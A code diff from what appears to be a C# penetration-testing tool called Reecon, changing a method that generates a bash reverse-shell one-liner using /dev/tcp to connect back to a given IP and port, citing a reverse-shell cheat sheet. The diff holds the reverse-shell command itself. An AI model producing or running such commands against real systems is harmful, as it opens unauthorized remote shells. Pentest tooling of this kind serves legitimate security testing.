@@ -88,7 +88,7 @@ namespace Reecon
         private static string BashShell(string ip, string port)
         {
             // http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
-            return "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
+            return "#!/bin/bash" + Environment.NewLine + "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1" + Environment.NewLine + "Note: File header is only required if it's a file and not a command";
         }
 
         private static string JSPShell(string ip, string port)
